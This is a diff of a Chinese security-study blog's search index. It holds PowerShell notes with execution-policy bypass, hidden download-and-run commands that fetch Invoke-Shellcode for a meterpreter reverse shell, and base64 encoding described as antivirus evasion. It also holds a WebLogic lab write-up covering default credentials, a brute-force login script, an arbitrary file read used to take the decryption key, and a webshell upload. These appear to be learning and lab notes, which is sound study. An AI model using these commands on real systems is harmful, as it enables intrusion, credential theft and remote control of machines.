-<li>新建目录：<code>New-Item whitecellclub-ItemType Directory</code></li>
-<li>新建文件：<code>New-Item light.txt-ItemType File</code></li>
-<li>删除目录：<code>Remove-Item whitecellclub</code></li>
-<li>显示文本内容：<code>Get-Content test.txt</code></li>
-<li>设置文本内容：<code>Set-Content test.txt-Value &quot;hello,world!&quot;</code></li>
-<li>追加内容：<code>Add-Content light.txt-Value &quot;hahaha&quot;</code></li>
-<li>清除内容：<code>Clear-Content test.txt</code></li>
-</ul>
-<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>在Windows终端下输入 <code>powershell</code>，进入powershell命令行环境。输入 <code>help</code> 显示帮助菜单</p>
-<p><img src="/posts/57592/F:%5Cimages%5Cimage-20200319175708381.png" alt="image-20200319175708381"></p>
-<p>要想运行powershell脚本程序，必须使用管理员权限将策略从<code>Restricted</code>改成<code>Unrestricted</code></p>
-<ol>
-<li><p>绕过本地权限并执行</p>
-<p>将PowerUp.ps1上传到目标服务器。在命令行下执行如下命令，绕过安全策略，在目标服务器执行该脚本</p>
-</li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="operator">-File</span> PowerUp.ps1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/57592/F:%5Cimages%5Cimage-20200320092852102.png" alt="image-20200320092852102"></p>
-<p>将同一个脚本上传到目标服务器中，在目标本地执行脚本文件</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">"&amp; &#123;Import-Module C:\PowerUp.ps1; Invoke-AllChecks&#125;"</span></span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>从网站服务器中下载脚本，绕过本地权限并隐藏执行</li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass<span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span><span class="literal">-NoProfile</span><span class="literal">-NonIIEX</span>(<span class="built_in">New-ObjectNet</span>.WebClient).DownloadString(<span class="string">"xxx.ps1"</span>);[<span class="type">Parameters</span>]</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass<span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span><span class="literal">-NoProfile</span><span class="literal">-NonIIEX</span>(<span class="built_in">New-ObjectNet</span>.WebClient).DownloadString(<span class="string">"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"</span>); <span class="built_in">Invoke-Shellcode</span> <span class="literal">-Payload</span> windows/meterpreter/reverse_https <span class="literal">-Lhost</span> <span class="number">192.168</span>.<span class="number">150.141</span> <span class="literal">-Lport</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>-ExecutionPolicy Bypass (-Exec Bypass)：绕过执行安全策略。这个参数非常重要。在默认情况下，powershell的安全策略规定powershell不能运行命令和文件。</li>
-<li>-WindowStyle Hidden (-W Hidden)：隐藏窗口</li>
-<li>-NonInteractive (-NonI)：非交互模式。powershell不为用户提供交互式的提示</li>
-<li>-NoProfile (-NoP)：powershell控制台不加载当前用户的配置文件</li>
-<li>-noexit：执行后不退出shell。这个参数在使用键盘记录等脚本时非常重要</li>
-<li>-NoLogo：启动不显示版权标志的powershell</li>
-</ul>
-<ol start="3">
-<li><p>使用base64对powershell命令进行编码</p>
-<p>使用Base64对powershell命令进行编码的目的是混淆和压缩代码，从而避免脚本因为一些特殊字符被杀毒软件查杀。</p>
-<p>可以使用python脚本对所有的powershell命令进行base64编码。<a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py" target="_blank" rel="noopener">python脚本</a></p>
-<p>在使用ps_encoder.py进行文本转换时，转换的对象必须是文本文件，因此先把命令保存为文本文件。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">echo <span class="string">"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1');Invoke-Shellcode-Payload windows/meterpreter/reverse_https -Lhost 192.168.150.141 -Lport 80 -Force"</span> &gt;raw.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/57592/F:%5Cimages%5Cimage-20200320110707604.png" alt="image-20200320110707604"></p>
-<p>在远程主机上执行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc base64编码</span><br></pre></td></tr></table></figure>
-
-
-</li>
-</ol>
-<h3 id="运行32位和64位powershell"><a href="#运行32位和64位powershell" class="headerlink" title="运行32位和64位powershell"></a>运行32位和64位powershell</h3><p>一些powershell脚本只能在指定平台上运行。在64位的Windows操作系统中，存在两个版本的powershell，一个是x64，另一个是x86。这两个版本的执行策略不会相互影响，可以把它们看成两个独立的程序。x64版本的powershell的配置文件在 <code>%windir%\syswow64\WindowsPowerShell\v1.0\</code>目录下。</p>
-<p>运行32位Powershell脚本</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-NoP</span> <span class="literal">-NonI</span> <span class="literal">-W</span> <span class="keyword">Hidden</span> <span class="literal">-Exec</span> Bypass</span><br></pre></td></tr></table></figure>
-
-<p>运行64位Powershell脚本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%windir%\syswow64\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure>
-
-<h3 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h3><p><a href="https://www.pstips.net/powershell-online-tutorials" target="_blank" rel="noopener">PowerShell 在线教程</a></p>
-]]></content>
-      <tags>
-        <tag>Powershell</tag>
       </tags>
   </entry>
   <entry>
@@ -2203,107 +2209,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>weblogic复现之weak_password</title>
-    <url>/posts/39385.html</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我第一次复现漏洞，从网上找了很多资料，基于vulhub中的weblogic的weak_password漏洞。这次顺便把漏洞复现的过程也写一下。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="Docker安装-Ubuntu-16-04"><a href="#Docker安装-Ubuntu-16-04" class="headerlink" title="Docker安装(Ubuntu 16.04)"></a>Docker安装(Ubuntu 16.04)</h3><h3 id="vulhub安装"><a href="#vulhub安装" class="headerlink" title="vulhub安装"></a>vulhub安装</h3><h3 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h3><ul>
-<li><p>进入weblogic中的weak_password环境目录</p>
-<p><code>cd vulhub-master/weblogic/weak_password</code></p>
-</li>
-<li><p>构建服务</p>
-<p><code>sudo docker-compose build</code></p>
-</li>
-<li><p>启动环境</p>
-<p><code>sudo docker-compose up -d</code></p>
-</li>
-<li><p>进入网址，查看是否部署成功</p>
-<p><code>http://your-ip:7001/console</code></p>
-</li>
-<li><p>本环境弱口令账号密码为</p>
-<ul>
-<li>账号： weblogic</li>
-<li>密码： Oracle@123</li>
-</ul>
-</li>
-</ul>
-<h2 id="weak-password"><a href="#weak-password" class="headerlink" title="weak_password"></a>weak_password</h2><h3 id="Weblogic常见弱口令总结"><a href="#Weblogic常见弱口令总结" class="headerlink" title="Weblogic常见弱口令总结"></a>Weblogic常见弱口令总结</h3><ul>
-<li>system:password        </li>
-<li>weblogic:weblogic        </li>
-<li>admin:secruity</li>
-<li>joe:password        </li>
-<li>mary:password        </li>
-<li>system:sercurity</li>
-<li>wlcsystem:wlcsystem        </li>
-<li>weblogic:Oracle@123</li>
-</ul>
-<h3 id="Burpsuite爆破"><a href="#Burpsuite爆破" class="headerlink" title="Burpsuite爆破"></a>Burpsuite爆破</h3><ol>
-<li><p>访问后台登录地址，输入任意账号密码，Burpsuite抓包</p>
-<p> <img src="/posts/39385/1.jpg" alt></p>
-</li>
-<li><p>点击右键，将其转发到Intruder模块下,设置数据</p>
-<p> <img src="/posts/39385/2.png" alt></p>
-<p> <img src="/posts/39385/3.png" alt="账号设置"></p>
-<p> <img src="/posts/39385/4.png" alt="密码设置"></p>
-</li>
-<li><p>开始爆破</p>
-<p> <img src="/posts/39385/5.png" alt></p>
-</li>
-</ol>
-<h3 id="Python脚本爆破"><a href="#Python脚本爆破" class="headerlink" title="Python脚本爆破"></a>Python脚本爆破</h3><p>Python小脚本的暴力破解思路和前面BurpSuite下的Intruder下的破解思路是一样的，换汤不换药。</p>
-<p>脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def weakPasswd():</span><br><span class="line"></span><br><span class="line">        pwddict &#x3D; [&#39;WebLogic&#39;, &#39;weblogic&#39;, &#39;Oracle@123&#39;, &#39;password&#39;, &#39;system&#39;, &#39;Administrator&#39;, &#39;admin&#39;, &#39;security&#39;, &#39;joe&#39;, &#39;wlcsystem&#39;, &#39;wlpisystem&#39;]</span><br><span class="line">        for user in pwddict:</span><br><span class="line">            for pwd in pwddict:</span><br><span class="line">                data &#x3D; &#123;</span><br><span class="line">                    &#39;j_username&#39;:user,</span><br><span class="line">                    &#39;j_password&#39;:pwd,</span><br><span class="line">                    &#39;j_character_encoding&#39;:&#39;UTF-8&#39;</span><br><span class="line">                &#125;</span><br><span class="line">                #这个位置设置目标地址</span><br><span class="line">                req &#x3D; requests.post(&#39;http:&#x2F;&#x2F;your-ip&#39;+&#39;:7001&#x2F;console&#x2F;j_security_check&#39;, data&#x3D;data)</span><br><span class="line"></span><br><span class="line">                if req.status_code &#x3D;&#x3D; 302 and &#39;console&#39; in req.text and &#39;LoginForm.jsp&#39; not in req.text:</span><br><span class="line">                    print(&#39;[+] WebLogic username: &#39;+user+&#39;  password: &#39;+pwd)</span><br><span class="line"></span><br><span class="line">weakPasswd()</span><br></pre></td></tr></table></figure>
-
-<h3 id="配合任意文件下载-读取漏洞来破解密码"><a href="#配合任意文件下载-读取漏洞来破解密码" class="headerlink" title="配合任意文件下载/读取漏洞来破解密码"></a>配合任意文件下载/读取漏洞来破解密码</h3><p>如果没有弱口令漏洞怎么办呢？</p>
-<p>刚巧，这个环境下存在一个任意文件下载漏洞。</p>
-<p>漏洞地址：</p>
-<p><code>http://your-ip:7001/hello/file.jsp?path=</code></p>
-<ul>
-<li><p>读取后台用户密文与密钥文件</p>
-<p>  Weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。</p>
-<p>  这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml文件中。</p>
-<p>  Burpsuite抓包，在路径path后面输入，./security/SerializedSystemIni.dat 路径，成功拦截到包，将其转发到Repeater模块下，点击Go按钮，来读取加密密钥，返回包是一串数据，如图：</p>
-<p>  <img src="/posts/39385/6.png" alt></p>
-<p>  现在我们将这串数据保存在本地，选中数据，点击鼠标右键，点击copy to file，选择保存路径（记住这个路径），点击保存，如图：</p>
-<p>  <img src="/posts/39385/7.png" alt></p>
-<p>  此时，加密密钥我们已经保存下来了，接下来，要寻找加密的密码了，它在 ./config/config.xml文件下的<node-manager-password-encrypted> 标签下，如图：</node-manager-password-encrypted></p>
-<p>  <img src="/posts/39385/8.png" alt></p>
-</li>
-</ul>
-<ul>
-<li><p>使用工具对后台密码进行破解</p>
-<p>  现在，我们打开破解工具，具体位置上面已说到，文件处即为我们刚才保存的文件，密文即为./config/config.xml文件下的<node-manager-password-encrypted> 标签中的内容，全部输入完成后，点击确定，开始破解。</node-manager-password-encrypted></p>
-<p>  <img src="/posts/39385/9.png" alt></p>
-</li>
-</ul>
-<h2 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h2><ol>
-<li><p>制作war包</p>
-<p>将webshell压缩成zip格式，修改后缀名为war即可</p>
-</li>
-<li><p>上传war包</p>
-<p>点击“部署”，“安装”</p>
-<p><img src="/posts/39385/10.png" alt></p>
-<p>上载文件</p>
-<p><img src="/posts/39385/11.png" alt></p>
-<p>选择文件，下一步</p>
-<p><img src="/posts/39385/12.png" alt></p>
-<p>下一步，“将此部署安装为应用程序”</p>
-<p>命名</p>
-<p><img src="/posts/39385/13.png" alt></p>
-<p>下一步，完成，保存</p>
-</li>
-<li><p>get shell</p>
-<p><img src="/posts/39385/14.png" alt></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>《渗透测试之信息收集》</title>
     <url>/posts/25470.html</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近学习渗透测试，先从最基本的开始吧。<br>在进行渗透测试之前，最重要的就是信息收集，我们要尽可能地收集目标的信息，越详细越好。</p>
@@ -2416,6 +2321,107 @@ string substr(string, start, length)
       </categories>
       <tags>
         <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>weblogic复现之weak_password</title>
+    <url>/posts/39385.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我第一次复现漏洞，从网上找了很多资料，基于vulhub中的weblogic的weak_password漏洞。这次顺便把漏洞复现的过程也写一下。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="Docker安装-Ubuntu-16-04"><a href="#Docker安装-Ubuntu-16-04" class="headerlink" title="Docker安装(Ubuntu 16.04)"></a>Docker安装(Ubuntu 16.04)</h3><h3 id="vulhub安装"><a href="#vulhub安装" class="headerlink" title="vulhub安装"></a>vulhub安装</h3><h3 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h3><ul>
+<li><p>进入weblogic中的weak_password环境目录</p>
+<p><code>cd vulhub-master/weblogic/weak_password</code></p>
+</li>
+<li><p>构建服务</p>
+<p><code>sudo docker-compose build</code></p>
+</li>
+<li><p>启动环境</p>
+<p><code>sudo docker-compose up -d</code></p>
+</li>
+<li><p>进入网址，查看是否部署成功</p>
+<p><code>http://your-ip:7001/console</code></p>
+</li>
+<li><p>本环境弱口令账号密码为</p>
+<ul>
+<li>账号： weblogic</li>
+<li>密码： Oracle@123</li>
+</ul>
+</li>
+</ul>
+<h2 id="weak-password"><a href="#weak-password" class="headerlink" title="weak_password"></a>weak_password</h2><h3 id="Weblogic常见弱口令总结"><a href="#Weblogic常见弱口令总结" class="headerlink" title="Weblogic常见弱口令总结"></a>Weblogic常见弱口令总结</h3><ul>
+<li>system:password        </li>
+<li>weblogic:weblogic        </li>
+<li>admin:secruity</li>
+<li>joe:password        </li>
+<li>mary:password        </li>
+<li>system:sercurity</li>
+<li>wlcsystem:wlcsystem        </li>
+<li>weblogic:Oracle@123</li>
+</ul>
+<h3 id="Burpsuite爆破"><a href="#Burpsuite爆破" class="headerlink" title="Burpsuite爆破"></a>Burpsuite爆破</h3><ol>
+<li><p>访问后台登录地址，输入任意账号密码，Burpsuite抓包</p>
+<p> <img src="/posts/39385/1.jpg" alt></p>
+</li>
+<li><p>点击右键，将其转发到Intruder模块下,设置数据</p>
+<p> <img src="/posts/39385/2.png" alt></p>
+<p> <img src="/posts/39385/3.png" alt="账号设置"></p>
+<p> <img src="/posts/39385/4.png" alt="密码设置"></p>
+</li>
+<li><p>开始爆破</p>
+<p> <img src="/posts/39385/5.png" alt></p>
+</li>
+</ol>
+<h3 id="Python脚本爆破"><a href="#Python脚本爆破" class="headerlink" title="Python脚本爆破"></a>Python脚本爆破</h3><p>Python小脚本的暴力破解思路和前面BurpSuite下的Intruder下的破解思路是一样的，换汤不换药。</p>
+<p>脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def weakPasswd():</span><br><span class="line"></span><br><span class="line">        pwddict &#x3D; [&#39;WebLogic&#39;, &#39;weblogic&#39;, &#39;Oracle@123&#39;, &#39;password&#39;, &#39;system&#39;, &#39;Administrator&#39;, &#39;admin&#39;, &#39;security&#39;, &#39;joe&#39;, &#39;wlcsystem&#39;, &#39;wlpisystem&#39;]</span><br><span class="line">        for user in pwddict:</span><br><span class="line">            for pwd in pwddict:</span><br><span class="line">                data &#x3D; &#123;</span><br><span class="line">                    &#39;j_username&#39;:user,</span><br><span class="line">                    &#39;j_password&#39;:pwd,</span><br><span class="line">                    &#39;j_character_encoding&#39;:&#39;UTF-8&#39;</span><br><span class="line">                &#125;</span><br><span class="line">                #这个位置设置目标地址</span><br><span class="line">                req &#x3D; requests.post(&#39;http:&#x2F;&#x2F;your-ip&#39;+&#39;:7001&#x2F;console&#x2F;j_security_check&#39;, data&#x3D;data)</span><br><span class="line"></span><br><span class="line">                if req.status_code &#x3D;&#x3D; 302 and &#39;console&#39; in req.text and &#39;LoginForm.jsp&#39; not in req.text:</span><br><span class="line">                    print(&#39;[+] WebLogic username: &#39;+user+&#39;  password: &#39;+pwd)</span><br><span class="line"></span><br><span class="line">weakPasswd()</span><br></pre></td></tr></table></figure>
+
+<h3 id="配合任意文件下载-读取漏洞来破解密码"><a href="#配合任意文件下载-读取漏洞来破解密码" class="headerlink" title="配合任意文件下载/读取漏洞来破解密码"></a>配合任意文件下载/读取漏洞来破解密码</h3><p>如果没有弱口令漏洞怎么办呢？</p>
+<p>刚巧，这个环境下存在一个任意文件下载漏洞。</p>
+<p>漏洞地址：</p>
+<p><code>http://your-ip:7001/hello/file.jsp?path=</code></p>
+<ul>
+<li><p>读取后台用户密文与密钥文件</p>
+<p>  Weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。</p>
+<p>  这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml文件中。</p>
+<p>  Burpsuite抓包，在路径path后面输入，./security/SerializedSystemIni.dat 路径，成功拦截到包，将其转发到Repeater模块下，点击Go按钮，来读取加密密钥，返回包是一串数据，如图：</p>
+<p>  <img src="/posts/39385/6.png" alt></p>
+<p>  现在我们将这串数据保存在本地，选中数据，点击鼠标右键，点击copy to file，选择保存路径（记住这个路径），点击保存，如图：</p>
+<p>  <img src="/posts/39385/7.png" alt></p>
+<p>  此时，加密密钥我们已经保存下来了，接下来，要寻找加密的密码了，它在 ./config/config.xml文件下的<node-manager-password-encrypted> 标签下，如图：</node-manager-password-encrypted></p>
+<p>  <img src="/posts/39385/8.png" alt></p>
+</li>
+</ul>
+<ul>
+<li><p>使用工具对后台密码进行破解</p>
+<p>  现在，我们打开破解工具，具体位置上面已说到，文件处即为我们刚才保存的文件，密文即为./config/config.xml文件下的<node-manager-password-encrypted> 标签中的内容，全部输入完成后，点击确定，开始破解。</node-manager-password-encrypted></p>
+<p>  <img src="/posts/39385/9.png" alt></p>
+</li>
+</ul>
+<h2 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h2><ol>
+<li><p>制作war包</p>
+<p>将webshell压缩成zip格式，修改后缀名为war即可</p>
+</li>
+<li><p>上传war包</p>
+<p>点击“部署”，“安装”</p>
+<p><img src="/posts/39385/10.png" alt></p>
+<p>上载文件</p>
+<p><img src="/posts/39385/11.png" alt></p>
+<p>选择文件，下一步</p>
+<p><img src="/posts/39385/12.png" alt></p>
+<p>下一步，“将此部署安装为应用程序”</p>
+<p>命名</p>
+<p><img src="/posts/39385/13.png" alt></p>
+<p>下一步，完成，保存</p>
+</li>
+<li><p>get shell</p>
+<p><img src="/posts/39385/14.png" alt></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -2625,6 +2631,32 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
+    <title>敏感词替换</title>
+    <url>/posts/31986.html</url>
+    <content><![CDATA[<h2 id="流程以及思路确定"><a href="#流程以及思路确定" class="headerlink" title="流程以及思路确定"></a>流程以及思路确定</h2><p>1.用户输入一串文字 ，保存到user_input中<br>2.检查文字是否有敏感词，以及敏感词的具体位置，直接使用relpace方式替换掉敏感词    <a id="more"></a><br>3.一句话中可能含有多个敏感字，这个时候就要重复2的步骤。<br>4.使用 * *len（str） 替换掉敏感词对应的个数。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># encoding:utf-8   </span><br><span class="line">user_input &#x3D; input(&#39;请输入:&#39;)   </span><br><span class="line">for filter_word in open(&#39;filter.txt&#39;):</span><br><span class="line">    filter &#x3D; filter_word.rstrip()</span><br><span class="line">    if filter in user_input:</span><br><span class="line">        filter_len &#x3D; len(filter)</span><br><span class="line">        user_input &#x3D; user_input.replace(filter,&#39;*&#39;*filter_len)</span><br><span class="line">else:</span><br><span class="line">    print(user_input)</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol>
+<li>python中文件的读取<br>函数open(filename,mode)用于读取文件，返回一个file object。 所以现在我们的filter.txt是一个文件对象<br>参数filename:是一个字符串，用来代表文件名.<br>参数mode:决定了打开文件的方式，比如只读(r)， 写入(w)， 追加等。</li>
+<li>rstrip()方法<br>Python rstrip() 删除 string 字符串末尾的指定字符（默认为空格）.<br>基本格式：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str.rstrip([chars])</span><br></pre></td></tr></table></figure>
+<ul>
+<li>chars – 指定删除的字符（默认为空格）</li>
+<li>返回删除 string 字符串末尾的指定字符后生成的新字符串</li>
+</ul>
+</li>
+<li>replace()方法<br>Python replace() 方法把字符串中的 old（旧字符串） 替换成 new(新字符串)，如果指定第三个参数max，则替换不超过 max 次。<br>基本格式：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">STR.REPLACE(OLD, NEW[, MAX])</span><br></pre></td></tr></table></figure>
+<ul>
+<li>old – 将被替换的子字符串。</li>
+<li>new – 新字符串，用于替换old子字符串。</li>
+<li>max – 可选字符串, 替换不超过 max 次</li>
+<li>返回字符串中的 old（旧字符串） 替换成 new(新字符串)后生成的新字符串，如果指定第三个参数max，则替换不超过 max 次。</li>
+</ul>
+</li>
+<li>for …else…<br>只有当循环里没有遇到 break 时，else 块才会执行。<br>当你想在房间里找某样东西时，只要在任意位置找到了，就停止继续搜查工作。但如果把整个房间都翻遍了，还没找到我们想要的东西，需要告诉人家说：这儿没有你要找的东西。<br>遇到这样的情况用 for … else ，除此之外，最好不要用它</li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
     <title>手工注入之常见字符串函数</title>
     <url>/posts/17087.html</url>
     <content><![CDATA[<p><img src="http://pp64r48ul.bkt.clouddn.com/sql1.png" alt></p>
@@ -2668,32 +2700,6 @@ string substr(string, start, length)
       <tags>
         <tag>SQL注入</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>敏感词替换</title>
-    <url>/posts/31986.html</url>
-    <content><![CDATA[<h2 id="流程以及思路确定"><a href="#流程以及思路确定" class="headerlink" title="流程以及思路确定"></a>流程以及思路确定</h2><p>1.用户输入一串文字 ，保存到user_input中<br>2.检查文字是否有敏感词，以及敏感词的具体位置，直接使用relpace方式替换掉敏感词    <a id="more"></a><br>3.一句话中可能含有多个敏感字，这个时候就要重复2的步骤。<br>4.使用 * *len（str） 替换掉敏感词对应的个数。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># encoding:utf-8   </span><br><span class="line">user_input &#x3D; input(&#39;请输入:&#39;)   </span><br><span class="line">for filter_word in open(&#39;filter.txt&#39;):</span><br><span class="line">    filter &#x3D; filter_word.rstrip()</span><br><span class="line">    if filter in user_input:</span><br><span class="line">        filter_len &#x3D; len(filter)</span><br><span class="line">        user_input &#x3D; user_input.replace(filter,&#39;*&#39;*filter_len)</span><br><span class="line">else:</span><br><span class="line">    print(user_input)</span><br></pre></td></tr></table></figure>
-
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol>
-<li>python中文件的读取<br>函数open(filename,mode)用于读取文件，返回一个file object。 所以现在我们的filter.txt是一个文件对象<br>参数filename:是一个字符串，用来代表文件名.<br>参数mode:决定了打开文件的方式，比如只读(r)， 写入(w)， 追加等。</li>
-<li>rstrip()方法<br>Python rstrip() 删除 string 字符串末尾的指定字符（默认为空格）.<br>基本格式：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str.rstrip([chars])</span><br></pre></td></tr></table></figure>
-<ul>
-<li>chars – 指定删除的字符（默认为空格）</li>
-<li>返回删除 string 字符串末尾的指定字符后生成的新字符串</li>
-</ul>
-</li>
-<li>replace()方法<br>Python replace() 方法把字符串中的 old（旧字符串） 替换成 new(新字符串)，如果指定第三个参数max，则替换不超过 max 次。<br>基本格式：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">STR.REPLACE(OLD, NEW[, MAX])</span><br></pre></td></tr></table></figure>
-<ul>
-<li>old – 将被替换的子字符串。</li>
-<li>new – 新字符串，用于替换old子字符串。</li>
-<li>max – 可选字符串, 替换不超过 max 次</li>
-<li>返回字符串中的 old（旧字符串） 替换成 new(新字符串)后生成的新字符串，如果指定第三个参数max，则替换不超过 max 次。</li>
-</ul>
-</li>
-<li>for …else…<br>只有当循环里没有遇到 break 时，else 块才会执行。<br>当你想在房间里找某样东西时，只要在任意位置找到了，就停止继续搜查工作。但如果把整个房间都翻遍了，还没找到我们想要的东西，需要告诉人家说：这儿没有你要找的东西。<br>遇到这样的情况用 for … else ，除此之外，最好不要用它</li>
-</ol>
-]]></content>
   </entry>
   <entry>
     <title>文件上传(一)之绕过姿势</title>
@@ -2757,27 +2763,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>文件上传(二)之实战篇</title>
-    <url>/posts/31481.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近打了场XCTF，看到同学在群里交流，自己不自觉留下来没有技术的泪水。。。<br>好吧，那就开始学吧。。。在网上找到一个不错的上传漏洞汇总的靶场，在本地搭建好环境，开始闭关。。。。。。</p>
-<p>靶场源码地址：<code>github.com/c0ny1/upload-labs</code></p>
-<p>我下载的是靶主已经集成配置好的环境进行本地搭建。</p>
-<p>地址：<code>github.com/c0ny1/upload-labs/releases</code></p>
-<p><img src="/posts/31481/%E4%B8%8A%E4%BC%A01.png" alt="界面"></p>
-<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p><img src="/posts/31481/%E4%B8%8A%E4%BC%A02.jpg" alt><br>上传一个<code>2.php</code>文件<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt><br>查看提示：<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt></p>
-<p>查看源码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>发现只允许上传<code>.jpg|.png|.gif</code>类型的文件</p>
-<p>未完。。。。。。</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>文件下载</title>
     <url>/posts/18452.html</url>
     <content><![CDATA[<h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于渗透测试来说，当我们拿到的目标权限过低，会很难进行下一步动作，便需要使用其他利器继续进行提权等操作，当需要将文件下载到目标机器时，就会用到文件下载命令。</p>
@@ -2825,6 +2810,27 @@ string substr(string, start, length)
 ]]></content>
   </entry>
   <entry>
+    <title>文件上传(二)之实战篇</title>
+    <url>/posts/31481.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近打了场XCTF，看到同学在群里交流，自己不自觉留下来没有技术的泪水。。。<br>好吧，那就开始学吧。。。在网上找到一个不错的上传漏洞汇总的靶场，在本地搭建好环境，开始闭关。。。。。。</p>
+<p>靶场源码地址：<code>github.com/c0ny1/upload-labs</code></p>
